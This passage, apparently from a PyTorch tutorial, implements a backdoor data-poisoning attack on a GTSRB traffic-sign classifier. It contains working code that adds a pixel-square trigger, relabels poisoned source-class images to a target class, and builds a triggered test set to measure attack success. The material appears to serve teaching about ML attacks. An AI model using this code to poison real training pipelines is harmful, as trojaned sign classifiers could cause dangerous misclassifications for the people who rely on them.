    <span class="hljs-attr">pin_memory=True,</span>  <span class="hljs-comment"># Speeds up CPU-&gt;GPU transfer if using CUDA</span>
)
</code></pre>
<p>Loading the test data requires a different approach because the image filenames and their corresponding class labels are provided in a separate CSV file (<code>GT-final_test.csv</code>), not implicitly through folder structure. Therefore, we define a custom dataset class <code>GTSRBTestset</code> that inherits from <code>torch.utils.data.Dataset</code>. Its <code>__init__</code> method reads the CSV file using <code>pandas</code>, storing the filenames and labels. The <code>__len__</code> method returns the total number of test samples, and the all important <code>__getitem__</code> method takes an index, finds the corresponding image filename and label from the CSV data, loads the image file using <code>PIL</code>, converts it to <code>RGB</code>, and applies the specified transformations (<code>transform_test</code>). It also includes error handling to gracefully manage cases where an image file might be missing or corrupted, returning a dummy tensor and an invalid label (-1) in such scenarios.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GTSRBTestset</span><span class="hljs-params">(Dataset)</span>:</span>
    <span class="hljs-string">"""Custom Dataset for GTSRB test set using annotations from a CSV file."""</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, csv_file, img_dir, transform=None)</span>:</span>
        <span class="hljs-string">"""
        Initializes the dataset by reading the CSV and storing paths/transforms.

        Args:
            csv_file (string): Path to the CSV file with 'Filename' and 'ClassId' columns.
            img_dir (string): Directory containing the test images.
            transform (callable, optional): Transform to be applied to each image.
        """</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># Read the CSV file, ensuring correct delimiter and handling potential BOM</span>
            <span class="hljs-keyword">with</span> open(csv_file, mode=<span class="hljs-string">"r"</span>, encoding=<span class="hljs-string">"utf-8-sig"</span>) <span class="hljs-keyword">as</span> f:
                self.img_labels = pd.read_csv(f, delimiter=<span class="hljs-string">";"</span>)
            <span class="hljs-comment"># Verify required columns exist</span>
            <span class="hljs-keyword">if</span> (
                <span class="hljs-string">"Filename"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.img_labels.columns
                <span class="hljs-keyword">or</span> <span class="hljs-string">"ClassId"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.img_labels.columns
            ):
                <span class="hljs-keyword">raise</span> ValueError(
                    <span class="hljs-string">"CSV file must contain 'Filename' and 'ClassId' columns."</span>
                )
        <span class="hljs-keyword">except</span> FileNotFoundError:
            print(f<span class="hljs-string">"Error: Test CSV file not found at '{csv_file}'"</span>)
            <span class="hljs-keyword">raise</span>
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            print(f<span class="hljs-string">"Error reading or parsing GTSRB test CSV '{csv_file}': {e}"</span>)
            <span class="hljs-keyword">raise</span>

        self.img_dir = img_dir
        self.transform = transform
        print(
            f<span class="hljs-string">"Loaded GTSRB test annotations from CSV '{os.path.basename(csv_file)}'. Found {len(self.img_labels)} entries."</span>
        )

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__len__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-string">"""Returns the total number of samples in the test set."""</span>
        <span class="hljs-keyword">return</span> len(self.img_labels)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__getitem__</span><span class="hljs-params">(self, idx)</span>:</span>
        <span class="hljs-string">"""
        Retrieves the image and label for a given index.

        Args:
            idx (int): The index of the sample to retrieve.

        Returns:
            tuple: (image, label) where image is the transformed image tensor,
                   and label is the integer class ID. Returns (dummy_tensor, -1)
                   if the image file cannot be loaded or processed.
        """</span>
        <span class="hljs-keyword">if</span> torch.is_tensor(idx):
            idx = idx.tolist()  <span class="hljs-comment"># Handle tensor index if needed</span>

        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># Get image filename and class ID from the pandas DataFrame</span>
            img_path_relative = self.img_labels.iloc[idx][<span class="hljs-string">"Filename"</span>]
            img_path = os.path.join(self.img_dir, img_path_relative)
            label = int(self.img_labels.iloc[idx][<span class="hljs-string">"ClassId"</span>])  <span class="hljs-comment"># Ensure label is integer</span>

            <span class="hljs-comment"># Open image using PIL and ensure it's in RGB format</span>
            image = Image.open(img_path).convert(<span class="hljs-string">"RGB"</span>)

        <span class="hljs-keyword">except</span> FileNotFoundError:
            print(f<span class="hljs-string">"Warning: Image file not found: {img_path} (Index {idx}). Skipping."</span>)
            <span class="hljs-keyword">return</span> torch.zeros(<span class="hljs-number">3</span>, IMG_SIZE, IMG_SIZE), <span class="hljs-number">-1</span>
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            print(f<span class="hljs-string">"Warning: Error opening image {img_path} (Index {idx}): {e}. Skipping."</span>)
            <span class="hljs-comment"># Return dummy data on other errors as well</span>
            <span class="hljs-keyword">return</span> torch.zeros(<span class="hljs-number">3</span>, IMG_SIZE, IMG_SIZE), <span class="hljs-number">-1</span>

        <span class="hljs-comment"># Apply transforms if they are provided</span>
        <span class="hljs-keyword">if</span> self.transform:
            <span class="hljs-keyword">try</span>:
                image = self.transform(image)
            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                print(
                    f<span class="hljs-string">"Warning: Error applying transform to image {img_path} (Index {idx}): {e}. Skipping."</span>
                )
                <span class="hljs-keyword">return</span> torch.zeros(<span class="hljs-number">3</span>, IMG_SIZE, IMG_SIZE), <span class="hljs-number">-1</span>

        <span class="hljs-keyword">return</span> image, label
</code></pre>
<p>Now we instantiate the clean test dataset using our custom <code>GTSRBTestset</code> class, providing the paths to the test CSV file and the directory containing the test images, along with the previously defined <code>transform_test</code>.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Load Clean Test Data using the custom Dataset</span>
<span class="hljs-keyword">try</span>:
    testset_clean = GTSRBTestset(
        csv_file=test_csv_path,
        img_dir=test_img_dir,
        transform=transform_test,  <span class="hljs-comment"># Apply test transforms</span>
    )
    print(f<span class="hljs-string">"Clean GTSRB test dataset loaded. Size: {len(testset_clean)}"</span>)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    print(f<span class="hljs-string">"Error creating GTSRB test dataset: {e}"</span>)
    <span class="hljs-keyword">raise</span> e
</code></pre>
<p>Finally, we create the <code>DataLoader</code> for the clean test set, <code>testloader_clean</code>. Similar to the training loader, it handles batching, however, for evaluation, shuffling (<code>shuffle=False</code>) is unnecessary and generally pretty undesired, as we want consistent evaluation results. Any samples that failed to load in <code>GTSRBTestset</code> (returning label -1) will need to be filtered out during the evaluation loop itself.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Create the DataLoader for the clean test dataset</span>
<span class="hljs-comment"># The DataLoader will now receive samples from GTSRBTestset.__getitem__</span>
<span class="hljs-comment"># We need to be aware that some samples might be (dummy_tensor, -1)</span>
<span class="hljs-comment"># The training/evaluation loops should handle filtering these out if they occur.</span>
<span class="hljs-keyword">try</span>:
    testloader_clean = DataLoader(
        testset_clean,
        batch_size=<span class="hljs-number">256</span>,  <span class="hljs-comment"># Batch size for evaluation</span>
        shuffle=<span class="hljs-keyword">False</span>,  <span class="hljs-comment"># No shuffling needed for testing</span>
        num_workers=<span class="hljs-number">0</span>,  <span class="hljs-comment"># Set based on system</span>
        pin_memory=<span class="hljs-keyword">True</span>,
    )
    print(f<span class="hljs-string">"Clean GTSRB test dataloader created."</span>)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
     print(f<span class="hljs-string">"Error creating GTSRB test dataloader: {e}"</span>)
     <span class="hljs-keyword">raise</span> e
</code></pre>
<hr>
<h2 id="the-attack-components">The Attack Components</h2>
<hr>
<p>The core of the attack mechanism is applying the actual trigger. We implement this in the <code>add_trigger</code> function. This function will take an image, represented as a <code>PyTorch</code> tensor (with pixel values already scaled between 0 and 1, typically after applying <code>transforms.ToTensor</code>), and modify it by overlaying a small, coloured square pattern (which will be our trigger).</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_trigger</span><span class="hljs-params">(image_tensor)</span>:</span>
    <span class="hljs-string">"""
    Adds the predefined trigger pattern to a single image tensor.
    The input tensor is expected to be in the [0, 1] value range (post ToTensor).

    Args:
        image_tensor (torch.Tensor): A single image tensor (C x H x W) in [0, 1] range.

    Returns:
        torch.Tensor: The image tensor with the trigger pattern applied.
    """</span>
    <span class="hljs-comment"># Input tensor shape should be (Channels, Height, Width)</span>
    c, h, w = image_tensor.shape

    <span class="hljs-comment"># Check if the input tensor has the expected dimensions</span>
    <span class="hljs-keyword">if</span> h != IMG_SIZE <span class="hljs-keyword">or</span> w != IMG_SIZE:
        <span class="hljs-comment"># This might occur if transforms change unexpectedly.</span>
        <span class="hljs-comment"># We print a warning but attempt to proceed.</span>
        print(
            f<span class="hljs-string">"Warning: add_trigger received tensor of unexpected size {h}x{w}. Expected {IMG_SIZE}x{IMG_SIZE}."</span>
        )

    <span class="hljs-comment"># Calculate trigger coordinates from predefined constants</span>
    start_x, start_y = TRIGGER_POS

    <span class="hljs-comment"># Prepare the trigger color tensor based on input image channels</span>
    <span class="hljs-comment"># Ensure the color tensor has the same number of channels as the image</span>
    <span class="hljs-keyword">if</span> c != len(TRIGGER_COLOR_VAL):
        <span class="hljs-comment"># If channel count mismatch (e.g., grayscale input, color trigger), adapt.</span>
        print(
            f<span class="hljs-string">"Warning: Input tensor channels ({c}) mismatch trigger color channels ({len(TRIGGER_COLOR_VAL)}). Using first color value for all channels."</span>
        )
        <span class="hljs-comment"># Create a tensor using only the first color value (e.g., R from RGB)</span>
        trigger_color_tensor = torch.full(
            (c, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>),  <span class="hljs-comment"># Shape (C, 1, 1) for broadcasting</span>
            TRIGGER_COLOR_VAL[<span class="hljs-number">0</span>],  <span class="hljs-comment"># Use the first component of the color tuple</span>
            dtype=image_tensor.dtype,
            device=image_tensor.device,
        )
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># Reshape the color tuple (e.g., (1.0, 0.0, 1.0)) into a (C, 1, 1) tensor</span>
        trigger_color_tensor = torch.tensor(
            TRIGGER_COLOR_VAL, dtype=image_tensor.dtype, device=image_tensor.device
        ).view(c, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># Reshape for broadcasting</span>

    <span class="hljs-comment"># Calculate effective trigger boundaries, clamping to image dimensions</span>
    <span class="hljs-comment"># This prevents errors if TRIGGER_POS or TRIGGER_SIZE are invalid</span>
    eff_start_y = max(<span class="hljs-number">0</span>, min(start_y, h - <span class="hljs-number">1</span>))
    eff_start_x = max(<span class="hljs-number">0</span>, min(start_x, w - <span class="hljs-number">1</span>))
    eff_end_y = max(<span class="hljs-number">0</span>, min(start_y + TRIGGER_SIZE, h))
    eff_end_x = max(<span class="hljs-number">0</span>, min(start_x + TRIGGER_SIZE, w))
    eff_trigger_size_y = eff_end_y - eff_start_y
    eff_trigger_size_x = eff_end_x - eff_start_x

    <span class="hljs-comment"># Check if the effective trigger size is valid after clamping</span>
    <span class="hljs-keyword">if</span> eff_trigger_size_y &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> eff_trigger_size_x &lt;= <span class="hljs-number">0</span>:
        print(
            f<span class="hljs-string">"Warning: Trigger position {TRIGGER_POS} and size {TRIGGER_SIZE} result in zero effective size on image {h}x{w}. Trigger not applied."</span>
        )
        <span class="hljs-keyword">return</span> image_tensor <span class="hljs-comment"># Return the original tensor if trigger is effectively size zero</span>

    <span class="hljs-comment"># Apply the trigger by assigning the color tensor to the specified patch</span>
    <span class="hljs-comment"># Broadcasting automatically fills the target area (eff_trigger_size_y x eff_trigger_size_x)</span>
    image_tensor[
        :,  <span class="hljs-comment"># All channels</span>
        eff_start_y:eff_end_y,  <span class="hljs-comment"># Y-slice (rows)</span>
        eff_start_x:eff_end_x,  <span class="hljs-comment"># X-slice (columns)</span>
    ] = trigger_color_tensor  <span class="hljs-comment"># Assign the broadcasted color</span>

    <span class="hljs-keyword">return</span> image_tensor <span class="hljs-comment"># Return the modified tensor</span>
</code></pre>
<p>Now, we define specialized <code>Dataset</code> classes to handle the specific needs of training the trojaned model and evaluating its performance.</p>
<p>The first such class will be the <code>PoisonedGTSRBTrain</code>, which is designed for training. It takes the clean training data, identifies images belonging to the <code>SOURCE_CLASS</code>, and selects a fraction (<code>POISON_RATE</code>) of these to poison. Poisoning involves changing the label to <code>TARGET_CLASS</code> and ensuring the <code>add_trigger</code> function is applied to the image during data retrieval. It carefully sequences the transformations: base transforms are applied first, then the trigger is conditionally added, and finally, the training-specific post-transforms (augmentation, normalization) are applied to all images (clean or poisoned).</p>
<p>Here we define the <code>PoisonedGTSRBTrain</code> class, starting with its initialization method (<code>__init__</code>). This method sets up the dataset by loading the samples using <code>ImageFolder</code>, identifying which samples belong to the <code>source_class</code>, and randomly selecting the specific indices that will be poisoned based on <code>poison_rate</code>. It stores these indices and creates a corresponding list of final target labels.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PoisonedGTSRBTrain</span><span class="hljs-params">(Dataset)</span>:</span>
    <span class="hljs-string">"""
    Dataset wrapper for creating a poisoned GTSRB training set.
    Uses ImageFolder structure internally.
    Applies a trigger to a specified fraction (`poison_rate`) of samples from the `source_class`, and changes their labels to `target_class`.
    Applies transforms sequentially:
        Base -&gt; Optional Trigger -&gt; Post (Augmentation + Normalization).
    """</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(
        self,
        root_dir,
        source_class,
        target_class,
        poison_rate,
        trigger_func,
        base_transform,  # Resize + ToTensor
        post_trigger_transform,  # Augmentation + Normalize
    )</span>:</span>
        <span class="hljs-string">"""
        Initializes the poisoned dataset.

        Args:
            root_dir (string): Path to the ImageFolder-structured training data.
            source_class (int): The class index (y_source) to poison.
            target_class (int): The class index (y_target) to assign poisoned samples.
            poison_rate (float): Fraction (0.0 to 1.0) of source_class samples to poison.
            trigger_func (callable): Function that adds the trigger to a tensor (e.g., add_trigger).
            base_transform (callable): Initial transforms (Resize, ToTensor).
            post_trigger_transform (callable): Final transforms (Augmentation, Normalize).
        """</span>
        self.source_class = source_class
        self.target_class = target_class
        self.poison_rate = poison_rate
        self.trigger_func = trigger_func
        self.base_transform = base_transform
        self.post_trigger_transform = post_trigger_transform

        <span class="hljs-comment"># Use ImageFolder to easily get image paths and original labels</span>
        <span class="hljs-comment"># We store the samples list: list of (image_path, original_class_index) tuples</span>
        self.image_folder = ImageFolder(root=root_dir)
        self.samples = self.image_folder.samples <span class="hljs-comment"># List of (filepath, class_idx)</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.samples:
            <span class="hljs-keyword">raise</span> ValueError(
                f<span class="hljs-string">"No samples found in ImageFolder at {root_dir}. Check path/structure."</span>
            )

        <span class="hljs-comment"># Identify and select indices of source_class images to poison</span>
        self.poisoned_indices = self._select_poison_indices()
        <span class="hljs-comment"># Create the final list of labels used for training (original or target_class)</span>
        self.targets = self._create_modified_targets()

        print(
            f<span class="hljs-string">"PoisonedGTSRBTrain initialized: Poisoning {len(self.poisoned_indices)} images."</span>
        )
        print(
            f<span class="hljs-string">" Source Class: {self.source_class} ({get_gtsrb_class_name(self.source_class)}) "</span>
            f<span class="hljs-string">"-&gt; Target Class: {self.target_class} ({get_gtsrb_class_name(self.target_class)})"</span>
        )

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_select_poison_indices</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-string">"""Identifies indices of source_class samples and selects a fraction to poison."""</span>
        <span class="hljs-comment"># Find all indices in self.samples that belong to the source_class</span>
        source_indices = [
            i
            <span class="hljs-keyword">for</span> i, (_, original_label) <span class="hljs-keyword">in</span> enumerate(self.samples)
            <span class="hljs-keyword">if</span> original_label == self.source_class
        ]

        num_source_samples = len(source_indices)
        num_to_poison = int(num_source_samples * self.poison_rate)

        <span class="hljs-keyword">if</span> num_to_poison == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> num_source_samples &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> self.poison_rate &gt; <span class="hljs-number">0</span>:
             print(
                 f<span class="hljs-string">"Warning: Calculated 0 samples to poison for source class {self.source_class} "</span>
                 f<span class="hljs-string">"(found {num_source_samples} samples, rate {self.poison_rate}). "</span>
                 f<span class="hljs-string">"Consider increasing poison_rate or checking class distribution."</span>
             )
             <span class="hljs-keyword">return</span> set()
        <span class="hljs-keyword">elif</span> num_source_samples == <span class="hljs-number">0</span>:
             print(f<span class="hljs-string">"Warning: No samples found for source class {self.source_class}. No poisoning possible."</span>)
             <span class="hljs-keyword">return</span> set()


        <span class="hljs-comment"># Randomly sample without replacement from the source indices</span>
        <span class="hljs-comment"># Uses the globally set random seed for reproducibility</span>
        <span class="hljs-comment"># Ensure num_to_poison doesn't exceed available samples (can happen with rounding)</span>
        num_to_poison = min(num_to_poison, num_source_samples)
        selected_indices = random.sample(source_indices, num_to_poison)
        print(
            f<span class="hljs-string">"Selected {len(selected_indices)} out of {num_source_samples} images of source class {self.source_class} ({get_gtsrb_class_name(self.source_class)}) to poison."</span>
        )
        <span class="hljs-comment"># Return a set for efficient O(1) lookup in __getitem__</span>
        <span class="hljs-keyword">return</span> set(selected_indices)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_create_modified_targets</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-string">"""Creates the final list of labels, changing poisoned sample labels to target_class."""</span>
        <span class="hljs-comment"># Start with the original labels from the ImageFolder samples</span>
        modified_targets = [original_label <span class="hljs-keyword">for</span> _, original_label <span class="hljs-keyword">in</span> self.samples]
        <span class="hljs-comment"># Overwrite labels for the selected poisoned indices</span>
        <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> self.poisoned_indices:
            <span class="hljs-comment"># Sanity check for index validity</span>
            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= idx &lt; len(modified_targets):
                modified_targets[idx] = self.target_class
            <span class="hljs-keyword">else</span>:
                <span class="hljs-comment"># This should ideally not happen if indices come from self.samples</span>
                print(
                    f<span class="hljs-string">"Warning: Invalid index {idx} encountered during target modification."</span>
                )
        <span class="hljs-keyword">return</span> modified_targets
</code></pre>
<p>Next, we define the required <code>__len__</code> and <code>__getitem__</code> methods. <code>__len__</code> simply returns the total number of samples. <code>__getitem__</code> is where the core logic resides: it retrieves the image path and final label for a given index, loads the image, applies the base transform, checks if the index is marked for poisoning (and applies the trigger if so), applies the post-trigger transforms (augmentation/normalization), and returns the processed image tensor and its final label.</p>
<p>Code: python</p>
<pre><code class="lang-python">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__len__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-string">"""Returns the total number of samples in the dataset."""</span>
        <span class="hljs-keyword">return</span> len(self.samples)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__getitem__</span><span class="hljs-params">(self, idx)</span>:</span>
        <span class="hljs-string">"""
        Retrieves a sample, applies transforms sequentially, adding trigger
        and modifying the label if the index is marked for poisoning.

        Args:
            idx (int): The index of the sample to retrieve.

        Returns:
            tuple: (image_tensor, final_label) where image_tensor is the fully
                   transformed image and final_label is the potentially modified label.
                   Returns (dummy_tensor, -1) on loading or processing errors.
        """</span>
        <span class="hljs-keyword">if</span> torch.is_tensor(idx):
            idx = idx.tolist()  <span class="hljs-comment"># Handle tensor index</span>

        <span class="hljs-comment"># Get the image path from the samples list</span>
        img_path, _ = self.samples[idx]
        <span class="hljs-comment"># Get the final label (original or target_class) from the precomputed list</span>
        target_label = self.targets[idx]

        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># Load the image using PIL</span>
            img = Image.open(img_path).convert(<span class="hljs-string">"RGB"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            print(
                f<span class="hljs-string">"Warning: Error loading image {img_path} in PoisonedGTSRBTrain (Index {idx}): {e}. Skipping sample."</span>
            )
            <span class="hljs-comment"># Return dummy data if image loading fails</span>
            <span class="hljs-keyword">return</span> torch.zeros(<span class="hljs-number">3</span>, IMG_SIZE, IMG_SIZE), <span class="hljs-number">-1</span>

        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># Apply base transform (e.g., Resize + ToTensor) -&gt; Tensor [0, 1]</span>
            img_tensor = self.base_transform(img)

            <span class="hljs-comment"># Apply trigger function ONLY if the index is in the poisoned set</span>
            <span class="hljs-keyword">if</span> idx <span class="hljs-keyword">in</span> self.poisoned_indices:
                <span class="hljs-comment"># Use clone() to ensure trigger_func doesn't modify the tensor needed elsewhere</span>
                <span class="hljs-comment"># if it operates inplace (though our add_trigger doesn't). Good practice.</span>
                img_tensor = self.trigger_func(img_tensor.clone())

            <span class="hljs-comment"># Apply post-trigger transforms (e.g., Augmentation + Normalization)</span>
            <span class="hljs-comment"># This is applied to ALL images (poisoned or clean) in this dataset wrapper</span>
            img_tensor = self.post_trigger_transform(img_tensor)

            <span class="hljs-keyword">return</span> img_tensor, target_label

        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            print(
                f<span class="hljs-string">"Warning: Error applying transforms/trigger to image {img_path} (Index {idx}): {e}. Skipping sample."</span>
            )
            <span class="hljs-keyword">return</span> torch.zeros(<span class="hljs-number">3</span>, IMG_SIZE, IMG_SIZE), <span class="hljs-number">-1</span>
</code></pre>
<p>The other class we need to implement is the <code>TriggeredGTSRBTestset</code> class, which is built for evaluating the Attack Success Rate (ASR). It uses the test dataset annotations (CSV file) but applies the <code>add_trigger</code> function to all test images it loads. Crucially here though, it keeps the original labels. This allows us to measure how often the trojaned model predicts the <code>TARGET_CLASS</code> when presented with a triggered image that originally belonged to the <code>SOURCE_CLASS</code> (or any other class). It applies base transforms, adds the trigger, and then applies normalization (without augmentation).</p>
<p>Its <code>__init__</code> method loads test annotations from the CSV. Its <code>__getitem__</code> method loads a test image, applies the base transform, always applies the trigger function, applies normalization, and returns the resulting triggered image tensor along with its original, unmodified label.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TriggeredGTSRBTestset</span><span class="hljs-params">(Dataset)</span>:</span>
    <span class="hljs-string">"""
    Dataset wrapper for the GTSRB test set that applies the trigger to ALL images,
    while retaining their ORIGINAL labels. Uses the CSV file for loading structure.
    Applies transforms sequentially: Base -&gt; Trigger -&gt; Normalization.
    Used for calculating Attack Success Rate (ASR).
    """</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(
        self,
        csv_file,
        img_dir,
        trigger_func,
        base_transform,  # e.g., Resize + ToTensor
        normalize_transform,  # e.g., Normalize only
    )</span>:</span>
        <span class="hljs-string">"""
        Initializes the triggered test dataset.

        Args:
            csv_file (string): Path to the test CSV file ('Filename', 'ClassId').
            img_dir (string): Directory containing the test images.
            trigger_func (callable): Function that adds the trigger to a tensor.
            base_transform (callable): Initial transforms (Resize, ToTensor).
            normalize_transform (callable): Final normalization transform.
        """</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># Load annotations from CSV</span>
            <span class="hljs-keyword">with</span> open(csv_file, mode=<span class="hljs-string">"r"</span>, encoding=<span class="hljs-string">"utf-8-sig"</span>) <span class="hljs-keyword">as</span> f:
                self.img_labels = pd.read_csv(f, delimiter=<span class="hljs-string">";"</span>)
            <span class="hljs-keyword">if</span> (
                <span class="hljs-string">"Filename"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.img_labels.columns
                <span class="hljs-keyword">or</span> <span class="hljs-string">"ClassId"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.img_labels.columns
            ):
                <span class="hljs-keyword">raise</span> ValueError(
                    <span class="hljs-string">"Test CSV must contain 'Filename' and 'ClassId' columns."</span>
                )
        <span class="hljs-keyword">except</span> FileNotFoundError:
            print(f<span class="hljs-string">"Error: Test CSV file not found at '{csv_file}'"</span>)
            <span class="hljs-keyword">raise</span>
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            print(f<span class="hljs-string">"Error reading test CSV '{csv_file}': {e}"</span>)
            <span class="hljs-keyword">raise</span>

        self.img_dir = img_dir
        self.trigger_func = trigger_func
        self.base_transform = base_transform
        self.normalize_transform = (
            normalize_transform  <span class="hljs-comment"># Store the specific normalization transform</span>
        )
        print(f<span class="hljs-string">"Initialized TriggeredGTSRBTestset with {len(self.img_labels)} samples."</span>)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__len__</span><span class="hljs-params">(self)</span>:</span>
        <span class="hljs-string">"""Returns the total number of test samples."""</span>
        <span class="hljs-keyword">return</span> len(self.img_labels)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__getitem__</span><span class="hljs-params">(self, idx)</span>:</span>
        <span class="hljs-string">"""
        Retrieves a test sample, applies the trigger, and returns the
        triggered image along with its original label.

        Args:
            idx (int): The index of the sample to retrieve.

        Returns:
            tuple: (triggered_image_tensor, original_label).
                   Returns (dummy_tensor, -1) on loading or processing errors.
        """</span>
        <span class="hljs-keyword">if</span> torch.is_tensor(idx):
            idx = idx.tolist()

        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># Get image path and original label (y_true) from CSV data</span>
            img_path_relative = self.img_labels.iloc[idx][<span class="hljs-string">"Filename"</span>]
            img_path = os.path.join(self.img_dir, img_path_relative)
            original_label = int(self.img_labels.iloc[idx][<span class="hljs-string">"ClassId"</span>])

            <span class="hljs-comment"># Load image</span>
            img = Image.open(img_path).convert(<span class="hljs-string">"RGB"</span>)

        <span class="hljs-keyword">except</span> FileNotFoundError:
            <span class="hljs-comment"># print(f"Warning: Image file not found: {img_path} (Index {idx}). Skipping.")</span>
            <span class="hljs-keyword">return</span> torch.zeros(<span class="hljs-number">3</span>, IMG_SIZE, IMG_SIZE), <span class="hljs-number">-1</span>
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            print(
                f<span class="hljs-string">"Warning: Error loading image {img_path} in TriggeredGTSRBTestset (Index {idx}): {e}. Skipping."</span>
            )
            <span class="hljs-keyword">return</span> torch.zeros(<span class="hljs-number">3</span>, IMG_SIZE, IMG_SIZE), <span class="hljs-number">-1</span>

        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># Apply base transform (Resize + ToTensor) -&gt; Tensor [0, 1]</span>
            img_tensor = self.base_transform(img)

            <span class="hljs-comment"># Apply trigger function to every image in this dataset</span>
            img_tensor = self.trigger_func(img_tensor.clone()) <span class="hljs-comment"># Use clone for safety</span>

            <span class="hljs-comment"># Apply normalization transform (applied after trigger)</span>
            img_tensor = self.normalize_transform(img_tensor)

            <span class="hljs-comment"># Return the triggered, normalized image and the ORIGINAL label</span>
            <span class="hljs-keyword">return</span> img_tensor, original_label

        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            print(
                f<span class="hljs-string">"Warning: Error applying transforms/trigger to image {img_path} (Index {idx}): {e}. Skipping."</span>
            )
            <span class="hljs-keyword">return</span> torch.zeros(<span class="hljs-number">3</span>, IMG_SIZE, IMG_SIZE), <span class="hljs-number">-1</span>
</code></pre>
<p>Finally, we instantiate these specialized datasets. We create <code>trainset_poisoned</code> by providing the parameters needed, like: the data directory, source/target classes, poison rate, trigger function, and the defined base and post-trigger transforms.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Instantiate the Poisoned Training Set</span>
try:
    <span class="hljs-attr">trainset_poisoned</span> = PoisonedGTSRBTrain(
        <span class="hljs-attr">root_dir=train_dir,</span>  <span class="hljs-comment"># Path to ImageFolder training data</span>
        <span class="hljs-attr">source_class=SOURCE_CLASS,</span>  <span class="hljs-comment"># Class to poison</span>
        <span class="hljs-attr">target_class=TARGET_CLASS,</span>  <span class="hljs-comment"># Target label for poisoned samples</span>
        <span class="hljs-attr">poison_rate=POISON_RATE,</span>  <span class="hljs-comment"># Fraction of source samples to poison</span>
        <span class="hljs-attr">trigger_func=add_trigger,</span>  <span class="hljs-comment"># Function to add the trigger pattern</span>
        <span class="hljs-attr">base_transform=transform_base,</span>  <span class="hljs-comment"># Resize + ToTensor</span>
        <span class="hljs-attr">post_trigger_transform=transform_train_post,</span>  <span class="hljs-comment"># Augmentation + Normalization</span>
    )
    print(f<span class="hljs-string">"Poisoned GTSRB training dataset created. Size: {len(trainset_poisoned)}"</span>)

except Exception as e:
    print(f<span class="hljs-string">"Error creating poisoned training dataset: {e}"</span>)
    <span class="hljs-comment"># Set to None to prevent errors in later cells if instantiation fails</span>
    <span class="hljs-attr">trainset_poisoned</span> = None
    raise e <span class="hljs-comment"># Re-raise exception</span>
</code></pre>
<p>We then wrap <code>trainset_poisoned</code> in a <code>DataLoader</code> called <code>trainloader_poisoned</code>, configured for training with appropriate batch size and shuffling.</p>
<p>Code: python</p>
<pre><code class="lang-python"><span class="hljs-comment"># Create DataLoader for the poisoned training set</span>
<span class="hljs-keyword">if</span> trainset_poisoned: <span class="hljs-comment"># Only proceed if dataset creation was successful</span>
    <span class="hljs-keyword">try</span>:
        trainloader_poisoned = DataLoader(
            trainset_poisoned,
            batch_size=<span class="hljs-number">256</span>,  <span class="hljs-comment"># Batch size for training</span>
            shuffle=<span class="hljs-keyword">True</span>,  <span class="hljs-comment"># Shuffle data each epoch</span>
